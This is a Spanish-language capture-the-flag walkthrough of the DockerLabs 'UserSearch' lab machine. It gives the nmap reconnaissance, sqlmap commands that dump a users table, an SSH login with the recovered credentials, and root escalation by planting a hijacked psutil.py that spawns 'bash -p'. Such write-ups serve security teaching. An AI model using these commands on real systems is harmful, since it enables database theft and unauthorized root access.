Máquina "UserSearch" de [DockerLabs](https://dockerlabs.es)

Autor: [kvzlx](https://www.youtube.com/@kvzlx)

Dificultad: Medio

![Usersearch](images/usersearch/img/DockerLabs.png)

# Reconocimiento

Comenzamos con un escaneo de `nmap`:

```css
nmap -sSVC -p- -Pn -n --open --min-rate 5000 -vvv 172.18.0.2 -oN escaneo.txt
```

```ruby
# Nmap 7.95 scan initiated Fri Dec 13 22:25:17 2024 as: nmap -sSVC -p- -Pn -n --open --min-rate 5000 -vvv -oN escaneo.txt 172.18.0.2
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.000016s latency).
Scanned at 2024-12-13 22:25:18 -03 for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 ea:6b:ef:51:9c:00:c4:d4:24:17:90:be:6d:0a:26:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP8i149J/z+cyzaGJoDVXl5AHyo4BO3C5DzkkWxzNaB77Kpz4si3PNs2uorTw1yztfmGmCA8NIWeW+TAybx57ok=
|   256 62:97:b5:91:0c:b0:8f:06:bd:ad:e3:d5:14:3d:f1:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINpY2NxmXtsHt71QdxZpHfmnjsqGymscWq6lf4kbIkVk
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: User Search
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 13 22:25:27 2024 -- 1 IP address (1 host up) scanned in 9.11 seconds
```

Vemos dos puertos abiertos:

• `Puerto 22: OpenSSH 9.2p1`

• `Puerto 80: Apache httpd 2.4.59`

y nos enfrentamos a una maquina linux debian.

Si vamos a la página en el puerto 80, veremos un formulario que nos permite buscar usuarios, esto nos da la idea de que puede haber una base de datos mysql por detras. Si tiramos directamente `sqlmap` para buscar una inyeccion sql, veremos que efectivamente es vulnerable, por lo que procedemos a listar la base de datos:

```css
sqlmap -u "http://172.18.0.2" --level 5 --risk 3 --batch --forms --dbs
```

y vemos que hay dos:

`information_schema`

`testdb`

A nosotros nos interesa la base de datos "testdb", por lo que continuaremos listando las tablas:

```css
sqlmap -u "http://172.18.0.2" --level 5 --risk 3 --batch --forms -D testdb --tables
```

una vez ejecutado, veremos que hay una tabla llamada "users", por lo que veremos todo lo que contiene de la siguiente manera:

```css
sqlmap -u "http://172.18.0.2" --level 5 --risk 3 --batch --forms -D testdb -T users --dump
```

```css
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | ************* | admin    |
| 2  | ************* | user1    |
| 3  | ************* | kvzlx    |
+----+---------------+----------+
```

# Intrusión

Continuamos probando las credenciales obtenidas en el ssh, y vemos que las correctas son las del usuario "kvzlx", por lo que nos conectamos (`ssh kvzlx@172.18.0.2`).

# Escalada de privilegios

### Kvzlx

Estando dentro, listamos los archivos y vemos que hay un código de python y si ejecutamos `sudo -l` veremos que lo podemos ejecutar como root. Si lo leemos veremos lo siguiente:

```css
import psutil


def print_virtual_memory():
    vm = psutil.virtual_memory()
    print(f"Total: {vm.total} Available: {vm.available}")


if __name__ == "__main__":
    print_virtual_memory()
```

Como vemos importa la libreria "psutil", por lo que podemos intuir que trata de un `python library hijacking`. Para realizarlo, debemos crear un archivo en el mismo directorio llamado "psutil.py", y dentro poner el siguiente contenido:

```css
import os

os.system("bash -p")
```

Luego ejecutamos el script de python normalmente pero nos dará una shell como root al momento.

Otra manera es borrar el script "system_info.py", ya que aun que no nos pertenezca, se encuentra en nuestro home, por lo que podemos borrarlo igual y crear otro.

## Root

![Root](images/usersearch/img/root.png)